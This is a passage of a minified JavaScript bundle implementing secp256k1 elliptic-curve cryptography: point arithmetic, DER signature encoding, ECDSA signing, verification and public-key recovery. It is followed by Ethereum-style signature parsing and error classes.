        r = 2 ** (e - 1),
        s = 2 ** e,
        i = gl(e),
        o = BigInt(e);
    return {
        windows: n,
        windowSize: r,
        mask: i,
        maxNumber: s,
        shiftBy: o
    }
}

function Pp(e, t, n) {
    const {
        windowSize: r,
        mask: s,
        maxNumber: i,
        shiftBy: o
    } = n;
    let a = Number(e & s),
        c = e >> o;
    a > r && (a -= i, c += h0);
    const u = t * r,
        l = u + Math.abs(a) - 1,
        f = a === 0,
        d = a < 0,
        h = t % 2 !== 0;
    return {
        nextN: c,
        offset: l,
        isZero: f,
        isNeg: d,
        isNegF: h,
        offsetF: u
    }
}

function KT(e, t) {
    if (!Array.isArray(e)) throw new Error("array expected");
    e.forEach((n, r) => {
        if (!(n instanceof t)) throw new Error("invalid point at index " + r)
    })
}

function ZT(e, t) {
    if (!Array.isArray(e)) throw new Error("array of scalars expected");
    e.forEach((n, r) => {
        if (!t.isValid(n)) throw new Error("invalid scalar at index " + r)
    })
}
const lu = new WeakMap,
    Sx = new WeakMap;

function uu(e) {
    return Sx.get(e) || 1
}

function YT(e, t) {
    return {
        constTimeNegate: au,
        hasPrecomputes(n) {
            return uu(n) !== 1
        },
        unsafeLadder(n, r, s = e.ZERO) {
            let i = n;
            for (; r > Np;) r & h0 && (s = s.add(i)), i = i.double(), r >>= h0;
            return s
        },
        precomputeWindow(n, r) {
            const {
                windows: s,
                windowSize: i
            } = cu(r, t), o = [];
            let a = n,
                c = a;
            for (let u = 0; u < s; u++) {
                c = a, o.push(c);
                for (let l = 1; l < i; l++) c = c.add(a), o.push(c);
                a = c.double()
            }
            return o
        },
        wNAF(n, r, s) {
            let i = e.ZERO,
                o = e.BASE;
            const a = cu(n, t);
            for (let c = 0; c < a.windows; c++) {
                const {
                    nextN: u,
                    offset: l,
                    isZero: f,
                    isNeg: d,
                    isNegF: h,
                    offsetF: b
                } = Pp(s, c, a);
                s = u, f ? o = o.add(au(h, r[b])) : i = i.add(au(d, r[l]))
            }
            return {
                p: i,
                f: o
            }
        },
        wNAFUnsafe(n, r, s, i = e.ZERO) {
            const o = cu(n, t);
            for (let a = 0; a < o.windows && s !== Np; a++) {
                const {
                    nextN: c,
                    offset: u,
                    isZero: l,
                    isNeg: f
                } = Pp(s, a, o);
                if (s = c, !l) {
                    const d = r[u];
                    i = i.add(f ? d.negate() : d)
                }
            }
            return i
        },
        getPrecomputes(n, r, s) {
            let i = lu.get(r);
            return i || (i = this.precomputeWindow(r, n), n !== 1 && lu.set(r, s(i))), i
        },
        wNAFCached(n, r, s) {
            const i = uu(n);
            return this.wNAF(i, this.getPrecomputes(i, n, s), r)
        },
        wNAFCachedUnsafe(n, r, s, i) {
            const o = uu(n);
            return o === 1 ? this.unsafeLadder(n, r, i) : this.wNAFUnsafe(o, this.getPrecomputes(o, n, s), r, i)
        },
        setWindowSize(n, r) {
            Tx(r, t), Sx.set(n, r), lu.delete(n)
        }
    }
}

function JT(e, t, n, r) {
    KT(n, e), ZT(r, t);
    const s = n.length,
        i = r.length;
    if (s !== i) throw new Error("arrays of points and scalars must have equal length");
    const o = e.ZERO,
        a = bv(BigInt(s));
    let c = 1;
    a > 12 ? c = a - 3 : a > 4 ? c = a - 2 : a > 0 && (c = 2);
    const u = gl(c),
        l = new Array(Number(u) + 1).fill(o),
        f = Math.floor((t.BITS - 1) / c) * c;
    let d = o;
    for (let h = f; h >= 0; h -= c) {
        l.fill(o);
        for (let m = 0; m < i; m++) {
            const _ = r[m],
                E = Number(_ >> BigInt(h) & u);
            l[E] = l[E].add(n[m])
        }
        let b = o;
        for (let m = l.length - 1, _ = o; m > 0; m--) _ = _.add(l[m]), b = b.add(_);
        if (d = d.add(b), h !== 0)
            for (let m = 0; m < c; m++) d = d.double()
    }
    return d
}

function Cx(e) {
    return GT(e.Fp), xl(e, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }), Object.freeze({
        ..._x(e.n, e.nBitLength),
        ...e,
        p: e.Fp.ORDER
    })
}

function Op(e) {
    e.lowS !== void 0 && Ao("lowS", e.lowS), e.prehash !== void 0 && Ao("prehash", e.prehash)
}

function QT(e) {
    const t = Cx(e);
    xl(t, {
        a: "field",
        b: "field"
    }, {
        allowInfinityPoint: "boolean",
        allowedPrivateKeyLengths: "array",
        clearCofactor: "function",
        fromBytes: "function",
        isTorsionFree: "function",
        toBytes: "function",
        wrapPrivateKey: "boolean"
    });
    const {
        endo: n,
        Fp: r,
        a: s
    } = t;
    if (n) {
        if (!r.eql(s, r.ZERO)) throw new Error("invalid endo: CURVE.a must be 0");
        if (typeof n != "object" || typeof n.beta != "bigint" || typeof n.splitScalar != "function") throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')
    }
    return Object.freeze({
        ...t
    })
}
class eS extends Error {
    constructor(t = "") {
        super(t)
    }
}
const Pn = {
    Err: eS,
    _tlv: {
        encode: (e, t) => {
            const {
                Err: n
            } = Pn;
            if (e < 0 || e > 256) throw new n("tlv.encode: wrong tag");
            if (t.length & 1) throw new n("tlv.encode: unpadded data");
            const r = t.length / 2,
                s = Ea(r);
            if (s.length / 2 & 128) throw new n("tlv.encode: long form length too big");
            const i = r > 127 ? Ea(s.length / 2 | 128) : "";
            return Ea(e) + i + s + t
        },
        decode(e, t) {
            const {
                Err: n
            } = Pn;
            let r = 0;
            if (e < 0 || e > 256) throw new n("tlv.encode: wrong tag");
            if (t.length < 2 || t[r++] !== e) throw new n("tlv.decode: wrong tlv");
            const s = t[r++],
                i = !!(s & 128);
            let o = 0;
            if (!i) o = s;
            else {
                const c = s & 127;
                if (!c) throw new n("tlv.decode(long): indefinite length not supported");
                if (c > 4) throw new n("tlv.decode(long): byte length is too big");
                const u = t.subarray(r, r + c);
                if (u.length !== c) throw new n("tlv.decode: length bytes not complete");
                if (u[0] === 0) throw new n("tlv.decode(long): zero leftmost byte");
                for (const l of u) o = o << 8 | l;
                if (r += c, o < 128) throw new n("tlv.decode(long): not minimal encoding")
            }
            const a = t.subarray(r, r + o);
            if (a.length !== o) throw new n("tlv.decode: wrong value length");
            return {
                v: a,
                l: t.subarray(r + o)
            }
        }
    },
    _int: {
        encode(e) {
            const {
                Err: t
            } = Pn;
            if (e < kn) throw new t("integer: negative integers are not allowed");
            let n = Ea(e);
            if (Number.parseInt(n[0], 16) & 8 && (n = "00" + n), n.length & 1) throw new t("unexpected DER parsing assertion: unpadded hex");
            return n
        },
        decode(e) {
            const {
                Err: t
            } = Pn;
            if (e[0] & 128) throw new t("invalid signature integer: negative");
            if (e[0] === 0 && !(e[1] & 128)) throw new t("invalid signature integer: unnecessary leading zero");
            return Zr(e)
        }
    },
    toSig(e) {
        const {
            Err: t,
            _int: n,
            _tlv: r
        } = Pn, s = Ut("signature", e), {
            v: i,
            l: o
        } = r.decode(48, s);
        if (o.length) throw new t("invalid signature: left bytes after parsing");
        const {
            v: a,
            l: c
        } = r.decode(2, i), {
            v: u,
            l
        } = r.decode(2, c);
        if (l.length) throw new t("invalid signature: left bytes after parsing");
        return {
            r: n.decode(a),
            s: n.decode(u)
        }
    },
    hexFromSig(e) {
        const {
            _tlv: t,
            _int: n
        } = Pn, r = t.encode(2, n.encode(e.r)), s = t.encode(2, n.encode(e.s)), i = r + s;
        return t.encode(48, i)
    }
};

function fu(e, t) {
    return No(sa(e, t))
}
const kn = BigInt(0),
    Ve = BigInt(1);
BigInt(2);
const du = BigInt(3),
    tS = BigInt(4);

function nS(e) {
    const t = QT(e),
        {
            Fp: n
        } = t,
        r = xd(t.n, t.nBitLength),
        s = t.toBytes || ((g, p, w) => {
            const A = p.toAffine();
            return hc(Uint8Array.from([4]), n.toBytes(A.x), n.toBytes(A.y))
        }),
        i = t.fromBytes || (g => {
            const p = g.subarray(1),
                w = n.fromBytes(p.subarray(0, n.BYTES)),
                A = n.fromBytes(p.subarray(n.BYTES, 2 * n.BYTES));
            return {
                x: w,
                y: A
            }
        });

    function o(g) {
        const {
            a: p,
            b: w
        } = t, A = n.sqr(g), N = n.mul(A, g);
        return n.add(n.add(N, n.mul(g, p)), w)
    }

    function a(g, p) {
        const w = n.sqr(p),
            A = o(g);
        return n.eql(w, A)
    }
    if (!a(t.Gx, t.Gy)) throw new Error("bad curve params: generator point");
    const c = n.mul(n.pow(t.a, du), tS),
        u = n.mul(n.sqr(t.b), BigInt(27));
    if (n.is0(n.add(c, u))) throw new Error("bad curve params: a or b");

    function l(g) {
        return rd(g, Ve, t.n)
    }

    function f(g) {
        const {
            allowedPrivateKeyLengths: p,
            nByteLength: w,
            wrapPrivateKey: A,
            n: N
        } = t;
        if (p && typeof g != "bigint") {
            if (ra(g) && (g = No(g)), typeof g != "string" || !p.includes(g.length)) throw new Error("invalid private key");
            g = g.padStart(w * 2, "0")
        }
        let v;
        try {
            v = typeof g == "bigint" ? g : Zr(Ut("private key", g, w))
        } catch {
            throw new Error("invalid private key, expected hex or " + w + " bytes, got " + typeof g)
        }
        return A && (v = gt(v, N)), $s("private key", v, Ve, N), v
    }

    function d(g) {
        if (!(g instanceof m)) throw new Error("ProjectivePoint expected")
    }
    const h = hp((g, p) => {
            const {
                px: w,
                py: A,
                pz: N
            } = g;
            if (n.eql(N, n.ONE)) return {
                x: w,
                y: A
            };
            const v = g.is0();
            p == null && (p = v ? n.ONE : n.inv(N));
            const y = n.mul(w, p),
                x = n.mul(A, p),
                I = n.mul(N, p);
            if (v) return {
                x: n.ZERO,
                y: n.ZERO
            };
            if (!n.eql(I, n.ONE)) throw new Error("invZ was invalid");
            return {
                x: y,
                y: x
            }
        }),
        b = hp(g => {
            if (g.is0()) {
                if (t.allowInfinityPoint && !n.is0(g.py)) return;
                throw new Error("bad point: ZERO")
            }
            const {
                x: p,
                y: w
            } = g.toAffine();
            if (!n.isValid(p) || !n.isValid(w)) throw new Error("bad point: x or y not FE");
            if (!a(p, w)) throw new Error("bad point: equation left != right");
            if (!g.isTorsionFree()) throw new Error("bad point: not in prime-order subgroup");
            return !0
        });
    class m {
        constructor(p, w, A) {
            if (p == null || !n.isValid(p)) throw new Error("x required");
            if (w == null || !n.isValid(w) || n.is0(w)) throw new Error("y required");
            if (A == null || !n.isValid(A)) throw new Error("z required");
            this.px = p, this.py = w, this.pz = A, Object.freeze(this)
        }
        static fromAffine(p) {
            const {
                x: w,
                y: A
            } = p || {};
            if (!p || !n.isValid(w) || !n.isValid(A)) throw new Error("invalid affine point");
            if (p instanceof m) throw new Error("projective point not allowed");
            const N = v => n.eql(v, n.ZERO);
            return N(w) && N(A) ? m.ZERO : new m(w, A, n.ONE)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static normalizeZ(p) {
            const w = wx(n, p.map(A => A.pz));
            return p.map((A, N) => A.toAffine(w[N])).map(m.fromAffine)
        }
        static fromHex(p) {
            const w = m.fromAffine(i(Ut("pointHex", p)));
            return w.assertValidity(), w
        }
        static fromPrivateKey(p) {
            return m.BASE.multiply(f(p))
        }
        static msm(p, w) {
            return JT(m, r, p, w)
        }
        _setWindowSize(p) {
            S.setWindowSize(this, p)
        }
        assertValidity() {
            b(this)
        }
        hasEvenY() {
            const {
                y: p
            } = this.toAffine();
            if (n.isOdd) return !n.isOdd(p);
            throw new Error("Field doesn't support isOdd")
        }
        equals(p) {
            d(p);
            const {
                px: w,
                py: A,
                pz: N
            } = this, {
                px: v,
                py: y,
                pz: x
            } = p, I = n.eql(n.mul(w, x), n.mul(v, N)), T = n.eql(n.mul(A, x), n.mul(y, N));
            return I && T
        }
        negate() {
            return new m(this.px, n.neg(this.py), this.pz)
        }
        double() {
            const {
                a: p,
                b: w
            } = t, A = n.mul(w, du), {
                px: N,
                py: v,
                pz: y
            } = this;
            let x = n.ZERO,
                I = n.ZERO,
                T = n.ZERO,
                O = n.mul(N, N),
                L = n.mul(v, v),
                k = n.mul(y, y),
                R = n.mul(N, v);
            return R = n.add(R, R), T = n.mul(N, y), T = n.add(T, T), x = n.mul(p, T), I = n.mul(A, k), I = n.add(x, I), x = n.sub(L, I), I = n.add(L, I), I = n.mul(x, I), x = n.mul(R, x), T = n.mul(A, T), k = n.mul(p, k), R = n.sub(O, k), R = n.mul(p, R), R = n.add(R, T), T = n.add(O, O), O = n.add(T, O), O = n.add(O, k), O = n.mul(O, R), I = n.add(I, O), k = n.mul(v, y), k = n.add(k, k), O = n.mul(k, R), x = n.sub(x, O), T = n.mul(k, L), T = n.add(T, T), T = n.add(T, T), new m(x, I, T)
        }
        add(p) {
            d(p);
            const {
                px: w,
                py: A,
                pz: N
            } = this, {
                px: v,
                py: y,
                pz: x
            } = p;
            let I = n.ZERO,
                T = n.ZERO,
                O = n.ZERO;
            const L = t.a,
                k = n.mul(t.b, du);
            let R = n.mul(w, v),
                D = n.mul(A, y),
                B = n.mul(N, x),
                q = n.add(w, A),
                Q = n.add(v, y);
            q = n.mul(q, Q), Q = n.add(R, D), q = n.sub(q, Q), Q = n.add(w, N);
            let se = n.add(v, x);
            return Q = n.mul(Q, se), se = n.add(R, B), Q = n.sub(Q, se), se = n.add(A, N), I = n.add(y, x), se = n.mul(se, I), I = n.add(D, B), se = n.sub(se, I), O = n.mul(L, Q), I = n.mul(k, B), O = n.add(I, O), I = n.sub(D, O), O = n.add(D, O), T = n.mul(I, O), D = n.add(R, R), D = n.add(D, R), B = n.mul(L, B), Q = n.mul(k, Q), D = n.add(D, B), B = n.sub(R, B), B = n.mul(L, B), Q = n.add(Q, B), R = n.mul(D, Q), T = n.add(T, R), R = n.mul(se, Q), I = n.mul(q, I), I = n.sub(I, R), R = n.mul(q, D), O = n.mul(se, O), O = n.add(O, R), new m(I, T, O)
        }
        subtract(p) {
            return this.add(p.negate())
        }
        is0() {
            return this.equals(m.ZERO)
        }
        wNAF(p) {
            return S.wNAFCached(this, p, m.normalizeZ)
        }
        multiplyUnsafe(p) {
            const {
                endo: w,
                n: A
            } = t;
            $s("scalar", p, kn, A);
            const N = m.ZERO;
            if (p === kn) return N;
            if (this.is0() || p === Ve) return this;
            if (!w || S.hasPrecomputes(this)) return S.wNAFCachedUnsafe(this, p, m.normalizeZ);
            let {
                k1neg: v,
                k1: y,
                k2neg: x,
                k2: I
            } = w.splitScalar(p), T = N, O = N, L = this;
            for (; y > kn || I > kn;) y & Ve && (T = T.add(L)), I & Ve && (O = O.add(L)), L = L.double(), y >>= Ve, I >>= Ve;
            return v && (T = T.negate()), x && (O = O.negate()), O = new m(n.mul(O.px, w.beta), O.py, O.pz), T.add(O)
        }
        multiply(p) {
            const {
                endo: w,
                n: A
            } = t;
            $s("scalar", p, Ve, A);
            let N, v;
            if (w) {
                const {
                    k1neg: y,
                    k1: x,
                    k2neg: I,
                    k2: T
                } = w.splitScalar(p);
                let {
                    p: O,
                    f: L
                } = this.wNAF(x), {
                    p: k,
                    f: R
                } = this.wNAF(T);
                O = S.constTimeNegate(y, O), k = S.constTimeNegate(I, k), k = new m(n.mul(k.px, w.beta), k.py, k.pz), N = O.add(k), v = L.add(R)
            } else {
                const {
                    p: y,
                    f: x
                } = this.wNAF(p);
                N = y, v = x
            }
            return m.normalizeZ([N, v])[0]
        }
        multiplyAndAddUnsafe(p, w, A) {
            const N = m.BASE,
                v = (x, I) => I === kn || I === Ve || !x.equals(N) ? x.multiplyUnsafe(I) : x.multiply(I),
                y = v(this, w).add(v(p, A));
            return y.is0() ? void 0 : y
        }
        toAffine(p) {
            return h(this, p)
        }
        isTorsionFree() {
            const {
                h: p,
                isTorsionFree: w
            } = t;
            if (p === Ve) return !0;
            if (w) return w(m, this);
            throw new Error("isTorsionFree() has not been declared for the elliptic curve")
        }
        clearCofactor() {
            const {
                h: p,
                clearCofactor: w
            } = t;
            return p === Ve ? this : w ? w(m, this) : this.multiplyUnsafe(t.h)
        }
        toRawBytes(p = !0) {
            return Ao("isCompressed", p), this.assertValidity(), s(m, this, p)
        }
        toHex(p = !0) {
            return Ao("isCompressed", p), No(this.toRawBytes(p))
        }
    }
    m.BASE = new m(t.Gx, t.Gy, n.ONE), m.ZERO = new m(n.ZERO, n.ONE, n.ZERO);
    const {
        endo: _,
        nBitLength: E
    } = t, S = YT(m, _ ? Math.ceil(E / 2) : E);
    return {
        CURVE: t,
        ProjectivePoint: m,
        normPrivateKeyToScalar: f,
        weierstrassEquation: o,
        isWithinCurveOrder: l
    }
}

function rS(e) {
    const t = Cx(e);
    return xl(t, {
        hash: "hash",
        hmac: "function",
        randomBytes: "function"
    }, {
        bits2int: "function",
        bits2int_modN: "function",
        lowS: "boolean"
    }), Object.freeze({
        lowS: !0,
        ...t
    })
}

function sS(e) {
    const t = rS(e),
        {
            Fp: n,
            n: r,
            nByteLength: s,
            nBitLength: i
        } = t,
        o = n.BYTES + 1,
        a = 2 * n.BYTES + 1;

    function c(k) {
        return gt(k, r)
    }

    function u(k) {
        return d0(k, r)
    }
    const {
        ProjectivePoint: l,
        normPrivateKeyToScalar: f,
        weierstrassEquation: d,
        isWithinCurveOrder: h
    } = nS({
        ...t,
        toBytes(k, R, D) {
            const B = R.toAffine(),
                q = n.toBytes(B.x),
                Q = hc;
            return Ao("isCompressed", D), D ? Q(Uint8Array.from([R.hasEvenY() ? 2 : 3]), q) : Q(Uint8Array.from([4]), q, n.toBytes(B.y))
        },
        fromBytes(k) {
            const R = k.length,
                D = k[0],
                B = k.subarray(1);
            if (R === o && (D === 2 || D === 3)) {
                const q = Zr(B);
                if (!rd(q, Ve, n.ORDER)) throw new Error("Point is not on curve");
                const Q = d(q);
                let se;
                try {
                    se = n.sqrt(Q)
                } catch (Ke) {
                    const De = Ke instanceof Error ? ": " + Ke.message : "";
                    throw new Error("Point is not on curve" + De)
                }
                const le = (se & Ve) === Ve;
                return (D & 1) === 1 !== le && (se = n.neg(se)), {
                    x: q,
                    y: se
                }
            } else if (R === a && D === 4) {
                const q = n.fromBytes(B.subarray(0, n.BYTES)),
                    Q = n.fromBytes(B.subarray(n.BYTES, 2 * n.BYTES));
                return {
                    x: q,
                    y: Q
                }
            } else {
                const q = o,
                    Q = a;
                throw new Error("invalid Point, expected length of " + q + ", or uncompressed " + Q + ", got " + R)
            }
        }
    });

    function b(k) {
        const R = r >> Ve;
        return k > R
    }

    function m(k) {
        return b(k) ? c(-k) : k
    }
    const _ = (k, R, D) => Zr(k.slice(R, D));
    class E {
        constructor(R, D, B) {
            $s("r", R, Ve, r), $s("s", D, Ve, r), this.r = R, this.s = D, B != null && (this.recovery = B), Object.freeze(this)
        }
        static fromCompact(R) {
            const D = s;
            return R = Ut("compactSignature", R, D * 2), new E(_(R, 0, D), _(R, D, 2 * D))
        }
        static fromDER(R) {
            const {
                r: D,
                s: B
            } = Pn.toSig(Ut("DER", R));
            return new E(D, B)
        }
        assertValidity() {}
        addRecoveryBit(R) {
            return new E(this.r, this.s, R)
        }
        recoverPublicKey(R) {
            const {
                r: D,
                s: B,
                recovery: q
            } = this, Q = N(Ut("msgHash", R));
            if (q == null || ![0, 1, 2, 3].includes(q)) throw new Error("recovery id invalid");
            const se = q === 2 || q === 3 ? D + t.n : D;
            if (se >= n.ORDER) throw new Error("recovery id 2 or 3 invalid");
            const le = (q & 1) === 0 ? "02" : "03",
                dt = l.fromHex(le + fu(se, n.BYTES)),
                Ke = u(se),
                De = c(-Q * Ke),
                $t = c(B * Ke),
                Ct = l.BASE.multiplyAndAddUnsafe(dt, De, $t);
            if (!Ct) throw new Error("point at infinify");
            return Ct.assertValidity(), Ct
        }
        hasHighS() {
            return b(this.s)
        }
        normalizeS() {
            return this.hasHighS() ? new E(this.r, c(-this.s), this.recovery) : this
        }
        toDERRawBytes() {
            return dc(this.toDERHex())
        }
        toDERHex() {
            return Pn.hexFromSig(this)
        }
        toCompactRawBytes() {
            return dc(this.toCompactHex())
        }
        toCompactHex() {
            const R = s;
            return fu(this.r, R) + fu(this.s, R)
        }
    }
    const S = {
        isValidPrivateKey(k) {
            try {
                return f(k), !0
            } catch {
                return !1
            }
        },
        normPrivateKeyToScalar: f,
        randomPrivateKey: () => {
            const k = vx(t.n);
            return XT(t.randomBytes(k), t.n)
        },
        precompute(k = 8, R = l.BASE) {
            return R._setWindowSize(k), R.multiply(BigInt(3)), R
        }
    };

    function g(k, R = !0) {
        return l.fromPrivateKey(k).toRawBytes(R)
    }

    function p(k) {
        if (typeof k == "bigint") return !1;
        if (k instanceof l) return !0;
        const D = Ut("key", k).length,
            B = n.BYTES,
            q = B + 1,
            Q = 2 * B + 1;
        if (!(t.allowedPrivateKeyLengths || s === q)) return D === q || D === Q
    }

    function w(k, R, D = !0) {
        if (p(k) === !0) throw new Error("first arg must be private key");
        if (p(R) === !1) throw new Error("second arg must be public key");
        return l.fromHex(R).multiply(f(k)).toRawBytes(D)
    }
    const A = t.bits2int || function(k) {
            if (k.length > 8192) throw new Error("input is too large");
            const R = Zr(k),
                D = k.length * 8 - i;
            return D > 0 ? R >> BigInt(D) : R
        },
        N = t.bits2int_modN || function(k) {
            return c(A(k))
        },
        v = gl(i);

    function y(k) {
        return $s("num < 2^" + i, k, kn, v), sa(k, s)
    }

    function x(k, R, D = I) {
        if (["recovered", "canonical"].some(sn => sn in D)) throw new Error("sign() legacy options not supported");
        const {
            hash: B,
            randomBytes: q
        } = t;
        let {
            lowS: Q,
            prehash: se,
            extraEntropy: le
        } = D;
        Q == null && (Q = !0), k = Ut("msgHash", k), Op(D), se && (k = Ut("prehashed msgHash", B(k)));
        const dt = N(k),
            Ke = f(R),
            De = [y(Ke), y(dt)];
        if (le != null && le !== !1) {
            const sn = le === !0 ? q(n.BYTES) : le;
            De.push(Ut("extraEntropy", sn))
        }
        const $t = hc(...De),
            Ct = dt;

        function Rr(sn) {
            const It = A(sn);
            if (!h(It)) return;
            const Mr = u(It),
                wn = l.BASE.multiply(It).toAffine(),
                C = c(wn.x);
            if (C === kn) return;
            const P = c(Mr * c(Ct + C * Ke));
            if (P === kn) return;
            let $ = (wn.x === C ? 0 : 2) | Number(wn.y & Ve),
                j = P;
            return Q && b(P) && (j = m(P), $ ^= 1), new E(C, j, $)
        }
        return {
            seed: $t,
            k2sig: Rr
        }
    }
    const I = {
            lowS: t.lowS,
            prehash: !1
        },
        T = {
            lowS: t.lowS,
            prehash: !1
        };

    function O(k, R, D = I) {
        const {
            seed: B,
            k2sig: q
        } = x(k, R, D), Q = t;
        return gv(Q.hash.outputLen, Q.nByteLength, Q.hmac)(B, q)
    }
    l.BASE._setWindowSize(8);

    function L(k, R, D, B = T) {
        const q = k;
        R = Ut("msgHash", R), D = Ut("publicKey", D);
        const {
            lowS: Q,
            prehash: se,
            format: le
        } = B;
        if (Op(B), "strict" in B) throw new Error("options.strict was renamed to lowS");
        if (le !== void 0 && le !== "compact" && le !== "der") throw new Error("format must be compact or der");
        const dt = typeof q == "string" || ra(q),
            Ke = !dt && !le && typeof q == "object" && q !== null && typeof q.r == "bigint" && typeof q.s == "bigint";
        if (!dt && !Ke) throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");
        let De, $t;
        try {
            if (Ke && (De = new E(q.r, q.s)), dt) {
                try {
                    le !== "compact" && (De = E.fromDER(q))
                } catch ($) {
                    if (!($ instanceof Pn.Err)) throw $
                }!De && le !== "der" && (De = E.fromCompact(q))
            }
            $t = l.fromHex(D)
        } catch {
            return !1
        }
        if (!De || Q && De.hasHighS()) return !1;
        se && (R = t.hash(R));
        const {
            r: Ct,
            s: Rr
        } = De, sn = N(R), It = u(Rr), Mr = c(sn * It), wn = c(Ct * It), C = l.BASE.multiplyAndAddUnsafe($t, Mr, wn)?.toAffine();
        return C ? c(C.x) === Ct : !1
    }
    return {
        CURVE: t,
        getPublicKey: g,
        getSharedSecret: w,
        sign: O,
        verify: L,
        ProjectivePoint: l,
        Signature: E,
        utils: S
    }
}

function iS(e) {
    return {
        hash: e,
        hmac: (t, ...n) => mx(e, t, ME(...n)),
        randomBytes: kE
    }
}

function oS(e, t) {
    const n = r => sS({
        ...e,
        ...iS(r)
    });
    return {
        ...n(t),
        create: n
    }
}
const Ix = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),
    Rp = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),
    aS = BigInt(0),
    cS = BigInt(1),
    p0 = BigInt(2),
    Mp = (e, t) => (e + t / p0) / t;

function lS(e) {
    const t = Ix,
        n = BigInt(3),
        r = BigInt(6),
        s = BigInt(11),
        i = BigInt(22),
        o = BigInt(23),
        a = BigInt(44),
        c = BigInt(88),
        u = e * e * e % t,
        l = u * u * e % t,
        f = Ft(l, n, t) * l % t,
        d = Ft(f, n, t) * l % t,
        h = Ft(d, p0, t) * u % t,
        b = Ft(h, s, t) * h % t,
        m = Ft(b, i, t) * b % t,
        _ = Ft(m, a, t) * m % t,
        E = Ft(_, c, t) * _ % t,
        S = Ft(E, a, t) * m % t,
        g = Ft(S, n, t) * l % t,
        p = Ft(g, o, t) * b % t,
        w = Ft(p, r, t) * u % t,
        A = Ft(w, p0, t);
    if (!m0.eql(m0.sqr(A), e)) throw new Error("Cannot find square root");
    return A
}
const m0 = xd(Ix, void 0, void 0, {
        sqrt: lS
    }),
    Ax = oS({
        a: aS,
        b: BigInt(7),
        Fp: m0,
        n: Rp,
        Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
        Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
        h: BigInt(1),
        lowS: !0,
        endo: {
            beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
            splitScalar: e => {
                const t = Rp,
                    n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                    r = -cS * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                    s = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                    i = n,
                    o = BigInt("0x100000000000000000000000000000000"),
                    a = Mp(i * e, t),
                    c = Mp(-r * e, t);
                let u = gt(e - a * n - c * s, t),
                    l = gt(-a * r - c * i, t);
                const f = u > o,
                    d = l > o;
                if (f && (u = t - u), d && (l = t - l), u > o || l > o) throw new Error("splitScalar: Endomorphism failed, k=" + e);
                return {
                    k1neg: f,
                    k1: u,
                    k2neg: d,
                    k2: l
                }
            }
        }
    }, fg),
    uS = Object.freeze(Object.defineProperty({
        __proto__: null,
        secp256k1: Ax
    }, Symbol.toStringTag, {
        value: "Module"
    }));

function Nx(e, t = {}) {
    const {
        recovered: n
    } = t;
    if (typeof e.r > "u") throw new hu({
        signature: e
    });
    if (typeof e.s > "u") throw new hu({
        signature: e
    });
    if (n && typeof e.yParity > "u") throw new hu({
        signature: e
    });
    if (e.r < 0n || e.r > Sp) throw new gS({
        value: e.r
    });
    if (e.s < 0n || e.s > Sp) throw new xS({
        value: e.s
    });
    if (typeof e.yParity == "number" && e.yParity !== 0 && e.yParity !== 1) throw new wd({
        value: e.yParity
    })
}

function fS(e) {
    return Px(tn(e))
}

function Px(e) {
    if (e.length !== 130 && e.length !== 132) throw new bS({
        signature: e
    });
    const t = BigInt(hn(e, 0, 32)),
        n = BigInt(hn(e, 32, 64)),
        r = (() => {
            const s = +`0x${e.slice(130)}`;
            if (!Number.isNaN(s)) try {
                return yd(s)
            } catch {
                throw new wd({
                    value: s
                })
            }
        })();
    return typeof r > "u" ? {
        r: t,
        s: n
    } : {
        r: t,
        s: n,
        yParity: r
    }
}

function dS(e) {
    if (!(typeof e.r > "u") && !(typeof e.s > "u")) return hS(e)
}

function hS(e) {
    const t = typeof e == "string" ? Px(e) : e instanceof Uint8Array ? fS(e) : typeof e.r == "string" ? mS(e) : e.v ? pS(e) : {
        r: e.r,
        s: e.s,
        ...typeof e.yParity < "u" ? {
            yParity: e.yParity
        } : {}
    };
    return Nx(t), t
}

function pS(e) {
    return {
        r: e.r,
        s: e.s,
        yParity: yd(e.v)
    }
}

function mS(e) {
    const t = (() => {
        const n = e.v ? Number(e.v) : void 0;
        let r = e.yParity ? Number(e.yParity) : void 0;
        if (typeof n == "number" && typeof r != "number" && (r = yd(n)), typeof r != "number") throw new wd({
            value: e.yParity
        });
        return r
    })();
    return {
        r: BigInt(e.r),
        s: BigInt(e.s),
        yParity: t
    }
}

function yd(e) {
    if (e === 0 || e === 27) return 0;
    if (e === 1 || e === 28) return 1;
    if (e >= 35) return e % 2 === 0 ? 1 : 0;
    throw new yS({
        value: e
    })
}
class bS extends ce {
    constructor({
        signature: t
    }) {
        super(`Value \`${t}\` is an invalid signature size.`, {
            metaMessages: ["Expected: 64 bytes or 65 bytes.", `Received ${kt(Hv(t))} bytes.`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.InvalidSerializedSizeError"
        })
    }
}
class hu extends ce {
    constructor({
        signature: t
    }) {
        super(`Signature \`${Eg(t)}\` is missing either an \`r\`, \`s\`, or \`yParity\` property.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.MissingPropertiesError"
        })
    }
}
class gS extends ce {
    constructor({
        value: t
    }) {
        super(`Value \`${t}\` is an invalid r value. r must be a positive integer less than 2^256.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.InvalidRError"
        })
    }
}
class xS extends ce {
    constructor({
        value: t
    }) {
        super(`Value \`${t}\` is an invalid s value. s must be a positive integer less than 2^256.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Signature.InvalidSError"
        })
    }
}
class wd extends ce {
    constructor({
        value: t
    }) {
